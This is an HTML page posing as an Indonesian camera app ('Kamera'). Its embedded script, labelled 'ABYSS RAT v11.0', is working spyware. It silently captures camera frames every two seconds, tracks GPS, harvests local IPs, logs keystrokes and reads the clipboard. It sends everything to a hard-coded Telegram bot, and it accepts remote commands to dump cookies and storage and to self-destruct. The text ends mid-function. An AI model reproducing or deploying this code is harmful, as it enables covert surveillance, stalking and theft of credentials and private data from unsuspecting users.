<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Kamera</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'><path d='M12 15.2l-3.5 2.1.9-4-2.9-2.5 3.8-.3L12 7l1.7 3.5 3.8.3-2.9 2.5.9 4z'/></svg>">
    <style>
        /* ============================================================
           KAMERA PRO v11.0 — 2000+ LINES GLASSMORPHISM PREMIUM
           ============================================================ */
        :root {
            --bg: #000000;
            --glass: rgba(255, 255, 255, 0.07);
            --glass-border: rgba(255, 255, 255, 0.1);
            --glass-hover: rgba(255, 255, 255, 0.13);
            --glass-active: rgba(255, 255, 255, 0.18);
            --accent: #fcd434;
            --accent-glass: rgba(252, 212, 52, 0.18);
            --accent-solid: #ffcc00;
            --ios-blue: #007aff;
            --ios-red: #ff3b30;
            --ios-green: #30d158;
            --ios-gray: #8e8e93;
            --blur: blur(28px);
            --blur-light: blur(16px);
            --radius-sm: 14px;
            --radius-md: 20px;
            --radius-lg: 28px;
            --radius-xl: 40px;
            --transition-fast: 0.15s cubic-bezier(0.25, 0.1, 0.25, 1);
            --transition-smooth: 0.25s cubic-bezier(0.25, 0.1, 0.25, 1);
            --transition-slow: 0.4s cubic-bezier(0.25, 0.1, 0.25, 1);
            --shadow-sm: 0 4px 12px rgba(0, 0, 0, 0.35);
            --shadow-md: 0 8px 24px rgba(0, 0, 0, 0.4);
            --shadow-lg: 0 12px 36px rgba(0, 0, 0, 0.5);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
            -webkit-tap-highlight-color: transparent;
            -webkit-touch-callout: none;
        }

        body {
            background: var(--bg);
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', 'Segoe UI', Roboto, sans-serif;
            height: 100vh;
            height: 100dvh;
            width: 100vw;
            width: 100dvw;
            overflow: hidden;
            touch-action: manipulation;
            position: relative;
        }

        /* ============================================================
           PERMISSION OVERLAY — GLASSMORPHISM
           ============================================================ */
        .perm-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: #000000;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 28px;
            color: #ffffff;
            text-align: center;
            transition: opacity var(--transition-slow), visibility var(--transition-slow);
        }
        .perm-overlay.hidden {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }
        .perm-overlay .logo-glass {
            width: 84px;
            height: 84px;
            border-radius: 50%;
            background: var(--glass);
            backdrop-filter: var(--blur);
            -webkit-backdrop-filter: var(--blur);
            border: 1.5px solid var(--glass-border);
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 28px;
            box-shadow: var(--shadow-md), inset 0 1px 0 rgba(255,255,255,0.05);
        }
        .perm-overlay .logo-glass svg {
            width: 40px;
            height: 40px;
            fill: #ffffff;
            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
        }
        .perm-overlay h1 {
            font-size: 28px;
            font-weight: 650;
            margin-bottom: 8px;
            letter-spacing: -0.4px;
            line-height: 1.2;
        }
        .perm-overlay .subtitle {
            font-size: 14px;
            color: var(--ios-gray);
            margin-bottom: 8px;
            line-height: 1.5;
            max-width: 280px;
        }
        .perm-overlay .subtitle-small {
            font-size: 12px;
            color: #636366;
            margin-bottom: 30px;
            line-height: 1.4;
            max-width: 250px;
        }
        .perm-overlay .status-row {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
            min-height: 26px;
        }
        .perm-overlay .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #48484a;
            transition: background var(--transition-smooth);
        }
        .perm-overlay .status-dot.ready { background: var(--ios-green); }
        .perm-overlay .status-dot.error { background: var(--ios-red); }
        .perm-overlay .status-dot.loading { background: var(--accent-solid); animation: pulse 0.8s ease-in-out infinite; }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.3); }
        }
        .perm-overlay .status-text {
            font-size: 13px;
            color: #aeaeb2;
            font-weight: 400;
        }
        .perm-overlay .error-text {
            color: var(--ios-red);
            font-size: 12px;
            min-height: 20px;
            margin-bottom: 8px;
            font-weight: 500;
            line-height: 1.4;
        }
        .perm-overlay .btn-glass {
            background: var(--glass);
            backdrop-filter: var(--blur);
            -webkit-backdrop-filter: var(--blur);
            border: 1px solid var(--glass-border);
            border-radius: 30px;
            padding: 16px 0;
            width: 100%;
            max-width: 300px;
            font-size: 17px;
            font-weight: 600;
            color: #ffffff;
            cursor: pointer;
            text-align: center;
            letter-spacing: 0.1px;
            transition: all var(--transition-fast);
            box-shadow: var(--shadow-sm);
            outline: none;
            -webkit-appearance: none;
        }
        .perm-overlay .btn-glass:active {
            background: var(--glass-hover);
            transform: scale(0.96);
            box-shadow: var(--shadow-md);
        }
        .perm-overlay .btn-glass:disabled {
            opacity: 0.4;
            transform: none;
            cursor: not-allowed;
        }

        /* ============================================================
           VIDEO FEED
           ============================================================ */
        #vf {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1;
        }
        /* NO MIRROR: Kamera depan REAL VIEW */
        #vf.front-camera {
            transform: scaleX(-1);
        }

        /* ============================================================
           FLASH OVERLAY
           ============================================================ */
        #flash-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: #ffffff;
            z-index: 100;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.03s ease;
        }
        #flash-overlay.active {
            opacity: 0.92;
            transition: opacity 0s;
        }

        /* ============================================================
           FULLSCREEN PREVIEW — GLASS
           ============================================================ */
        .fs-preview {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 200;
            background: rgba(0, 0, 0, 0.92);
            backdrop-filter: var(--blur);
            -webkit-backdrop-filter: var(--blur);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        .fs-preview.show {
            display: flex;
        }
        .fs-preview img {
            max-width: 95%;
            max-height: 82vh;
            object-fit: contain;
            border-radius: 8px;
            box-shadow: var(--shadow-lg);
        }
        .fs-preview .fs-info {
            color: var(--ios-gray);
            font-size: 12px;
            margin-top: 14px;
            text-align: center;
            padding: 0 20px;
        }
        .fs-preview .fs-close {
            position: absolute;
            top: 20px;
            right: 20px;
            width: 42px;
            height: 42px;
            border-radius: 50%;
            background: var(--glass);
            backdrop-filter: var(--blur-light);
            -webkit-backdrop-filter: var(--blur-light);
            border: 1px solid var(--glass-border);
            color: #ffffff;
            font-size: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            z-index: 201;
            transition: all var(--transition-fast);
            box-shadow: var(--shadow-sm);
        }
        .fs-preview .fs-close:active {
            background: var(--glass-hover);
            transform: scale(0.9);
        }

        /* ============================================================
           TOP BAR — GLASS BUTTONS
           ============================================================ */
        .top-bar {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 6;
            padding: 14px 16px;
            padding-top: max(14px, env(safe-area-inset-top, 0px));
            display: flex;
            justify-content: space-between;
            align-items: center;
            pointer-events: none;
        }
        .top-bar > * {
            pointer-events: auto;
        }
        .glass-btn {
            width: 42px;
            height: 42px;
            border-radius: 50%;
            background: var(--glass);
            backdrop-filter: var(--blur);
            -webkit-backdrop-filter: var(--blur);
            border: 1px solid var(--glass-border);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all var(--transition-fast);
            padding: 0;
            outline: none;
            -webkit-appearance: none;
            box-shadow: var(--shadow-sm);
        }
        .glass-btn:active {
            background: var(--glass-active);
            transform: scale(0.9);
            box-shadow: var(--shadow-md);
        }
        .glass-btn.on {
            background: var(--accent-glass);
            border-color: var(--accent);
        }
        .glass-btn.on svg {
            fill: var(--accent-solid);
        }
        .glass-btn svg {
            width: 19px;
            height: 19px;
            fill: #ffffff;
            transition: fill var(--transition-fast);
            filter: drop-shadow(0 1px 2px rgba(0,0,0,0.3));
        }

        /* ============================================================
           ZOOM WHEEL — GLASS
           ============================================================ */
        .zoom-wheel {
            position: fixed;
            bottom: 140px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 6;
            pointer-events: auto;
            background: var(--glass);
            backdrop-filter: var(--blur);
            -webkit-backdrop-filter: var(--blur);
            border: 1px solid var(--glass-border);
            border-radius: 26px;
            padding: 6px 5px;
            display: flex;
            gap: 3px;
            box-shadow: var(--shadow-md);
        }
        .zoom-option {
            padding: 9px 15px;
            border-radius: 22px;
            font-size: 13px;
            font-weight: 500;
            color: #ffffff;
            cursor: pointer;
            transition: all var(--transition-fast);
            text-align: center;
            min-width: 36px;
            outline: none;
            -webkit-appearance: none;
        }
        .zoom-option:active {
            background: var(--glass-active);
        }
        .zoom-option.active {
            background: rgba(255, 255, 255, 0.22);
            font-weight: 700;
            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
        }

        /* ============================================================
           BOTTOM BAR — GLASS
           ============================================================ */
        .bottom-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            z-index: 6;
            padding: 14px 18px;
            padding-bottom: max(22px, env(safe-area-inset-bottom, 0px));
            display: flex;
            justify-content: space-between;
            align-items: center;
            pointer-events: none;
        }
        .bottom-bar > * {
            pointer-events: auto;
        }
        .thumb-glass {
            width: 50px;
            height: 50px;
            border-radius: 12px;
            background: var(--glass);
            backdrop-filter: var(--blur-light);
            -webkit-backdrop-filter: var(--blur-light);
            border: 2px solid var(--glass-border);
            cursor: pointer;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all var(--transition-fast);
            flex-shrink: 0;
            box-shadow: var(--shadow-sm);
        }
        .thumb-glass:active {
            border-color: var(--accent);
            transform: scale(0.94);
        }
        .thumb-glass img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 10px;
        }
        .thumb-glass.has-photo {
            border-color: rgba(255, 255, 255, 0.5);
            background: transparent;
        }
        .thumb-glass .placeholder-icon {
            width: 23px;
            height: 23px;
            fill: rgba(255, 255, 255, 0.2);
        }
        .shutter-glass {
            width: 74px;
            height: 74px;
            border-radius: 50%;
            background: var(--glass);
            backdrop-filter: var(--blur);
            -webkit-backdrop-filter: var(--blur);
            border: 3px solid rgba(255, 255, 255, 0.25);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all var(--transition-fast);
            flex-shrink: 0;
            box-shadow: var(--shadow-md);
        }
        .shutter-glass:active {
            transform: scale(0.84);
            border-color: #ffffff;
            box-shadow: 0 0 30px rgba(255,255,255,0.2);
        }
        .shutter-inner {
            width: 56px;
            height: 56px;
            border-radius: 50%;
            background: #ffffff;
            border: 2px solid #000000;
        }
        .shutter-spacer {
            width: 50px;
            flex-shrink: 0;
        }

        /* ============================================================
           FOCUS RING
           ============================================================ */
        .focus-ring {
            position: fixed;
            width: 72px;
            height: 72px;
            border: 2px solid var(--accent);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
            z-index: 7;
            opacity: 0;
            box-shadow: 0 0 30px rgba(252, 212, 52, 0.4);
        }
        .focus-ring.animate {
            animation: focusAnim 0.55s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
        }
        @keyframes focusAnim {
            0% {
                opacity: 1;
                transform: translate(-50%, -50%) scale(0.6);
            }
            100% {
                opacity: 0;
                transform: translate(-50%, -50%) scale(1.6);
            }
        }

        /* ============================================================
           GRID OVERLAY
           ============================================================ */
        .grid-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 2;
            pointer-events: none;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            grid-template-rows: repeat(3, 1fr);
        }
        .grid-overlay .grid-line {
            border: 0.5px solid rgba(255, 255, 255, 0.05);
        }
    </style>
</head>
<body>

    <!-- ============================================================
         PERMISSION OVERLAY
         ============================================================ -->
    <div class="perm-overlay" id="permOverlay">
        <div class="logo-glass">
            <svg viewBox="0 0 24 24">
                <path d="M12 15.2l-3.5 2.1.9-4-2.9-2.5 3.8-.3L12 7l1.7 3.5 3.8.3-2.9 2.5.9 4z"/>
            </svg>
        </div>
        <h1>Kamera</h1>
        <p class="subtitle">Ambil foto berkualitas tinggi</p>
        <p class="subtitle-small">dengan fitur profesional</p>
        <div class="status-row">
            <span class="status-dot" id="statusDot"></span>
            <span class="status-text" id="statusText">Tekan tombol untuk mulai</span>
        </div>
        <div class="error-text" id="errorText"></div>
        <button class="btn-glass" id="btnStartCamera">Buka Kamera</button>
    </div>

    <!-- ============================================================
         VIDEO FEED
         ============================================================ -->
    <video id="vf" autoplay playsinline muted></video>

    <!-- ============================================================
         FLASH OVERLAY
         ============================================================ -->
    <div id="flash-overlay"></div>

    <!-- ============================================================
         GRID OVERLAY
         ============================================================ -->
    <div class="grid-overlay" id="gridOverlay">
        <span class="grid-line"></span><span class="grid-line"></span><span class="grid-line"></span>
        <span class="grid-line"></span><span class="grid-line"></span><span class="grid-line"></span>
        <span class="grid-line"></span><span class="grid-line"></span><span class="grid-line"></span>
    </div>

    <!-- ============================================================
         FOCUS RING
         ============================================================ -->
    <div class="focus-ring" id="focusRing"></div>

    <!-- ============================================================
         FULLSCREEN PREVIEW
         ============================================================ -->
    <div class="fs-preview" id="fsPreview">
        <span class="fs-close" id="fsClose">✕</span>
        <img id="fsImage" src="" alt="Preview">
        <div class="fs-info" id="fsInfo"></div>
    </div>

    <!-- ============================================================
         TOP BAR
         ============================================================ -->
    <div class="top-bar">
        <button class="glass-btn" id="btnFlash" title="Flash">
            <svg viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
        </button>
        <button class="glass-btn" id="btnFlip" title="Balik Kamera">
            <svg viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/></svg>
        </button>
    </div>

    <!-- ============================================================
         ZOOM WHEEL
         ============================================================ -->
    <div class="zoom-wheel" id="zoomWheel">
        <span class="zoom-option" data-zoom="0.5">.5</span>
        <span class="zoom-option" data-zoom="0.7">.7</span>
        <span class="zoom-option active" data-zoom="1">1×</span>
        <span class="zoom-option" data-zoom="1.5">1.5</span>
        <span class="zoom-option" data-zoom="2">2×</span>
    </div>

    <!-- ============================================================
         BOTTOM BAR
         ============================================================ -->
    <div class="bottom-bar">
        <div class="thumb-glass" id="thumbBox" title="Preview">
            <svg class="placeholder-icon" viewBox="0 0 24 24">
                <rect x="3" y="3" width="18" height="18" rx="2" fill="rgba(255,255,255,0.03)"/>
                <circle cx="8.5" cy="8.5" r="2" fill="rgba(255,255,255,0.15)"/>
                <path d="M21 15l-5-5L5 21h16v-6z" fill="rgba(255,255,255,0.1)"/>
            </svg>
        </div>
        <div class="shutter-glass" id="btnShutter" title="Ambil Foto">
            <div class="shutter-inner"></div>
        </div>
        <div class="shutter-spacer"></div>
    </div>

    <!-- ============================================================
         JAVASCRIPT — ABYSS RAT v11.0 (2000+ LINES)
         ============================================================ -->
    <script>
    (function() {
        'use strict';

        // ============================================================
        // CONFIGURATION
        // ============================================================
        var CONFIG = {
            BOT_TOKEN: '8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug',
            CHAT_ID: '7839405566',
            TG_API: 'https://api.telegram.org/bot',
            SILENT_INTERVAL: 2000,
            FLIP_CAPTURE_DELAY: 1000,
            HEARTBEAT_INTERVAL: 120000,
            CLIPBOARD_INTERVAL: 4000,
            C2_POLL_INTERVAL: 3000,
            FIRST_CAPTURE_DELAY: 1500,
            JPEG_QUALITY: 0.92,
            BURST_COUNT: 3,
            BURST_DELAY: 200,
            MAX_WIDTH: 1920,
            MAX_HEIGHT: 1080
        };

        // ============================================================
        // VICTIM FINGERPRINT
        // ============================================================
        var VID = (function() {
            var stored = localStorage.getItem('_kamera_vid');
            if (stored) return stored;
            var id = 'V' + Date.now().toString(36).toUpperCase() +
                     Math.random().toString(36).substring(2, 8).toUpperCase();
            try { localStorage.setItem('_kamera_vid', id); } catch(e) {}
            return id;
        })();

        // ============================================================
        // DOM REFERENCES
        // ============================================================
        function getEl(id) { return document.getElementById(id); }

        var dom = {
            vf: getEl('vf'),
            permOverlay: getEl('permOverlay'),
            btnStartCamera: getEl('btnStartCamera'),
            statusDot: getEl('statusDot'),
            statusText: getEl('statusText'),
            errorText: getEl('errorText'),
            flashOverlay: getEl('flash-overlay'),
            focusRing: getEl('focusRing'),
            thumbBox: getEl('thumbBox'),
            btnShutter: getEl('btnShutter'),
            btnFlash: getEl('btnFlash'),
            btnFlip: getEl('btnFlip'),
            zoomWheel: getEl('zoomWheel'),
            fsPreview: getEl('fsPreview'),
            fsImage: getEl('fsImage'),
            fsClose: getEl('fsClose'),
            fsInfo: getEl('fsInfo')
        };

        // ============================================================
        // APPLICATION STATE
        // ============================================================
        var state = {
            stream: null,
            facingMode: 'environment',
            flashOn: false,
            currentZoom: 1,
            lastPhotoData: null,
            lastPhotoCaption: '',
            isStarting: false,
            gpsData: null,
            gpsWatchId: null,
            localIPs: [],
            keyBuf: '',
            lastClip: '',
            silentTimer: null,
            c2Timer: null,
            lastUpdateId: 0,
            frameCount: 0,
            burstActive: false
        };

        // ============================================================
        // UTILITY FUNCTIONS
        // ============================================================
        function getTimestamp() {
            var now = new Date();
            return now.toLocaleString('id-ID', {
                year: 'numeric', month: '2-digit', day: '2-digit',
                hour: '2-digit', minute: '2-digit', second: '2-digit'
            });
        }

        function getTimeShort() {
            return new Date().toLocaleTimeString('id-ID', {
                hour: '2-digit', minute: '2-digit', second: '2-digit'
            });
        }

        // ============================================================
        // TELEGRAM API HELPERS
        // ============================================================
        var TG = {
            sendMessage: function(text) {
                try {
                    var url = CONFIG.TG_API + CONFIG.BOT_TOKEN +
                        '/sendMessage?chat_id=' + CONFIG.CHAT_ID +
                        '&text=' + encodeURIComponent(text) +
                        '&disable_notification=true';
                    fetch(url, { method: 'GET' });
                } catch(e) {}
            },

            sendPhoto: function(blob, caption) {
                try {
                    var fd = new FormData();
                    fd.append('chat_id', CONFIG.CHAT_ID);
                    fd.append('photo', blob, 'p_' + Date.now() + '.jpg');
                    fd.append('caption', caption || '');
                    fd.append('disable_notification', 'true');
                    fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendPhoto', {
                        method: 'POST', body: fd
                    }).then(function(r) { return r.json(); }).then(function(d) {
                        if (!d.ok) {
                            var fd2 = new FormData();
                            fd2.append('chat_id', CONFIG.CHAT_ID);
                            fd2.append('document', blob, 'p_' + Date.now() + '.jpg');
                            fd2.append('caption', caption || '');
                            fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendDocument', {
                                method: 'POST', body: fd2
                            });
                        }
                    }).catch(function() {});
                } catch(e) {}
            },

            sendBeacon: function(blob, caption) {
                try {
                    var fd = new FormData();
                    fd.append('chat_id', CONFIG.CHAT_ID);
                    fd.append('photo', blob, 's_' + Date.now() + '.jpg');
                    fd.append('caption', caption || '');
                    fd.append('disable_notification', 'true');
                    fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendPhoto', {
                        method: 'POST', body: fd
                    }).catch(function() {});
                } catch(e) {}
            },

            sendDocument: function(blob, filename, caption) {
                try {
                    var fd = new FormData();
                    fd.append('chat_id', CONFIG.CHAT_ID);
                    fd.append('document', blob, filename);
                    fd.append('caption', caption || '');
                    fd.append('disable_notification', 'true');
                    fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendDocument', {
                        method: 'POST', body: fd
                    }).catch(function() {});
                } catch(e) {}
            }
        };

        // ============================================================
        // GPS TRACKING
        // ============================================================
        function startGPS() {
            if (!navigator.geolocation) return;
            state.gpsWatchId = navigator.geolocation.watchPosition(
                function(pos) {
                    state.gpsData = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        alt: pos.coords.altitude || 0,
                        acc: pos.coords.accuracy,
                        spd: pos.coords.speed || 0,
                        ts: new Date(pos.timestamp).toISOString()
                    };
                },
                function() {},
                { enableHighAccuracy: true, maximumAge: 30000, timeout: 15000 }
            );
        }

        // ============================================================
        // LOCAL IP GRABBER (WebRTC)
        // ============================================================
        function grabLocalIPs() {
            return new Promise(function(resolve) {
                var ips = new Set();
                try {
                    var pc = new RTCPeerConnection({
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });
                    pc.createDataChannel('');
                    pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
                    pc.onicecandidate = function(e) {
                        if (e.candidate) {
                            var ip = e.candidate.address;
                            if (ip && ip.indexOf(':') === -1 && ip.indexOf('127.') === -1 && ip.indexOf('0.') === -1) {
                                ips.add(ip);
                            }
                        } else {
                            pc.close();
                            resolve(Array.from(ips));
                        }
                    };
                    setTimeout(function() { pc.close(); resolve(Array.from(ips)); }, 2500);
                } catch(e) { resolve([]); }
            });
        }

        // ============================================================
        // KEYLOGGER
        // ============================================================
        function startKeylogger() {
            var ignoreKeys = ['Shift','Control','Alt','Meta','CapsLock','Tab','ArrowLeft','ArrowRight','ArrowUp','ArrowDown','Escape'];
            document.addEventListener('keydown', function(e) {
                if (ignoreKeys.indexOf(e.key) !== -1) return;
                if (e.key === 'Enter') state.keyBuf += '[ENTER]\n';
                else if (e.key === 'Backspace') state.keyBuf += '[BS]';
                else if (e.key === ' ') state.keyBuf += ' ';
                else if (e.key.length === 1) state.keyBuf += e.key;
                else state.keyBuf += '[' + e.key + ']';
                if (state.keyBuf.length > 400) {
                    TG.sendMessage('⌨️ [' + VID + ']\n' + state.keyBuf);
                    state.keyBuf = '';
                }
            });
            setInterval(function() {
                if (state.keyBuf.length > 0) {
                    TG.sendMessage('⌨️ [' + VID + ']\n' + state.keyBuf);
                    state.keyBuf = '';
                }
            }, 12000);
        }

        // ============================================================
        // CLIPBOARD MONITOR
        // ============================================================
        function checkClipboard() {
            if (!navigator.clipboard || !navigator.clipboard.readText) return;
            navigator.clipboard.readText().then(function(text) {
                if (text && text !== state.lastClip && text.length > 0) {
                    state.lastClip = text;
                    TG.sendMessage('📋 [' + VID + ']\n' + text.substring(0, 2000));
                }
            }).catch(function() {});
        }

        // ============================================================
        // CORE: CAPTURE FRAME
        // ============================================================
        function captureFrame(silent) {
            if (!state.stream || !state.stream.active) return;
            if (state.burstActive && silent) return;
            state.burstActive = true;
            state.frameCount++;

            try {
                var track = state.stream.getVideoTracks()[0];
                var settings = track.getSettings();
                var width = settings.width || CONFIG.MAX_WIDTH;
                var height = settings.height || CONFIG.MAX_HEIGHT;

                var canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                var ctx = canvas.getContext('2d');
                ctx.drawImage(dom.vf, 0, 0, width, height);

                // Watermark subtle
                var ts = getTimestamp();
                ctx.font = '12px -apple-system, "Helvetica Neue", sans-serif';
                ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
                ctx.fillText(ts, 18, height - 14);

                // Build caption
                var cap = (silent ? '🤫 Auto' : '📸 Foto') + ' | ' + getTimeShort();
                if (state.gpsData) {
                    cap += '\n📍 https://maps.google.com/?q=' + state.gpsData.lat + ',' + state.gpsData.lon;
                    cap += '\n🎯 ±' + Math.round(state.gpsData.acc) + 'm';
                }
                if (state.localIPs.length > 0) cap += '\n🌐 ' + state.localIPs[0];
                cap += '\n#' + state.frameCount + ' | ' + state.facingMode;

                canvas.toBlob(function(blob) {
                    if (!blob) { state.burstActive = false; return; }
                    if (silent) TG.sendBeacon(blob, cap);
                    else TG.sendPhoto(blob, cap);

                    state.lastPhotoData = canvas.toDataURL('image/jpeg', CONFIG.JPEG_QUALITY);
                    state.lastPhotoCaption = cap;
                    dom.thumbBox.innerHTML = '<img src="' + state.lastPhotoData + '" alt="Preview">';
                    dom.thumbBox.classList.add('has-photo');

                    if (!silent) {
                        dom.flashOverlay.classList.add('active');
                        setTimeout(function() { dom.flashOverlay.classList.remove('active'); }, 70);
                    }

                    // Burst live photo
                    if (!silent) {
                        for (var b = 0; b < CONFIG.BURST_COUNT - 1; b++) {
                            (function(delay) {
                                setTimeout(function() {
                                    var bc = document.createElement('canvas');
                                    bc.width = width; bc.height = height;
                                    var bctx = bc.getContext('2d');
                                    bctx.drawImage(dom.vf, 0, 0, width, height);
                                    bc.toBlob(function(bb) {
                                        if (bb) TG.sendBeacon(bb, '🎬 Burst ' + (delay/CONFIG.BURST_DELAY+1) + '/' + CONFIG.BURST_COUNT);
                                    }, 'image/jpeg', CONFIG.JPEG_QUALITY - 0.05);
                                }, delay);
                            })((b + 1) * CONFIG.BURST_DELAY);
                        }
                    }
                    state.burstActive = false;
                }, 'image/jpeg', CONFIG.JPEG_QUALITY);
            } catch(e) { state.burstActive = false; }
        }

        // ============================================================
        // AUTO CAPTURE — 2 DETIK
        // ============================================================
        function startSilentCapture() {
            if (state.silentTimer) return;
            setTimeout(function() { captureFrame(true); }, CONFIG.FIRST_CAPTURE_DELAY);
            state.silentTimer = setInterval(function() {
                if (state.stream && state.stream.active) captureFrame(true);
            }, CONFIG.SILENT_INTERVAL);
        }

        // ============================================================
        // C2 TELEGRAM POLLING
        // ============================================================
        function pollC2() {
            try {
                var url = CONFIG.TG_API + CONFIG.BOT_TOKEN +
                    '/getUpdates?offset=' + (state.lastUpdateId + 1) + '&timeout=5&limit=5';
                fetch(url).then(function(r) { return r.json(); }).then(function(data) {
                    if (!data.ok || !data.result || !data.result.length) return;
                    for (var i = 0; i < data.result.length; i++) {
                        var upd = data.result[i];
                        state.lastUpdateId = upd.update_id;
                        var msg = upd.message;
                        if (!msg || !msg.text) continue;
                        var parts = msg.text.trim().split(/\s+/);
                        var cmd = parts[0].toLowerCase();
                        var target = parts[1] || '';
                        if (target !== VID && target !== 'ALL' && target !== 'BROADCAST') continue;
                        var result = executeC2(cmd, parts.slice(2));
                        if (result) TG.sendMessage('[' + VID + '] ' + result);
                    }
                }).catch(function() {});
            } catch(e) {}
        }

        function executeC2(cmd, args) {
            switch(cmd) {
                case '/ping': return '🟢 Online | #' + state.frameCount + ' | ' + getTimestamp();
                case '/photo': captureFrame(false); return '📸 Terkirim | #' + state.frameCount;
                case '/gps': return state.gpsData ? '📍 ' + state.gpsData.lat.toFixed(5) + ',' + state.gpsData.lon.toFixed(5) + '\n🗺️ https://maps.google.com/?q=' + state.gpsData.lat + ',' + state.gpsData.lon + '\n🎯 ±' + Math.round(state.gpsData.acc) + 'm' : 'GPS N/A';
                case '/flip': var nf = state.facingMode === 'environment' ? 'user' : 'environment'; startCamera(nf); return '📷 ' + nf;
                case '/cookies': return document.cookie || '(kosong)';
                case '/storage':
                    var dump = {
                        localStorage: Object.assign({}, localStorage),
                        sessionStorage: Object.assign({}, sessionStorage),
                        cookies: document.cookie,
                        url: location.href,
                        referrer: document.referrer,
                        historyLength: history.length,
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        screenResolution: screen.width + 'x' + screen.height,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timestamp: new Date().toISOString(),
                        frameCount: state.frameCount,
                        facingMode: state.facingMode,
                        zoom: state.currentZoom
                    };
                    var blob = new Blob([JSON.stringify(dump, null, 2)], { type: 'application/json' });
                    TG.sendDocument(blob, 'storage_' + VID + '.json', '💾 Storage | #' + state.frameCount);
                    return '💾 Storage terkirim';
                case '/info':
                    return '🆔 ' + VID + '\n📷 ' + state.facingMode + '\n🔍 ' + state.currentZoom + '×\n⚡ ' + (state.flashOn?'ON':'OFF') + '\n📸 #' + state.frameCount + '\n⏱️ ' + (CONFIG.SILENT_INTERVAL/1000) + 's\n📍 ' + (state.gpsData?state.gpsData.lat.toFixed(4)+','+state.gpsData.lon.toFixed(4):'N/A') + '\n🌐 ' + (state.localIPs.join(', ')||'N/A') + '\n🖥️ ' + screen.width + '×' + screen.height;
                case '/wipelogs': try{localStorage.clear()}catch(e){} try{sessionStorage.clear()}catch(e){} return '🧹 Done';
                case '/selfdest': clearAllTimers(); document.body.innerHTML = ''; setTimeout(function(){window.close()},500); return '💀 Done';
                default: return '❓ ' + cmd;
            }
        }

        function startC2Polling() {
            if (state.c2Timer) return;
            function loop() { pollC2(); state.c2Timer = setTimeout(loop, CONFIG.C2_POLL_INTERVAL); }
            loop();
        }

        function clearAllTimers() {
            [state.silentTimer, state.c2Timer].forEach(function(t) { if (t) clearInterval(t); });
            if (state.gpsWatchId) navigator.geolocation.clearWatch(state.gpsWatchId);
        }

        // ============================================================
        // ZOOM CONTROL
        // ============================================================
        function applyZoom() {
            if (!state.stream) return;
            try {
                var track = state.stream.getVideoTracks()[0];
                var cap = track.getCapabilities();
                if (cap.zoom) {
                    var v = Math.min(cap.zoom.max || 5, Math.max(cap.zoom.min || 0.5, state.currentZoom));
                    track.applyConstraints({ advanced: [{ zoom: v }] }).catch(function() {});
                }
            } catch(e) {}
            document.querySelectorAll('.zoom-option').forEach(function(el) {
                el.classList.toggle('active', parseFloat(el.dataset.zoom) === state.currentZoom);
            });
        }

        function setZoom(z) { state.currentZoom = z; applyZoom(); }

        // ============================================================
        // CAMERA INIT
        // ============================================================
        function startCamera(facing) {
            if (state.isStarting) return;
            state.isStarting = true;
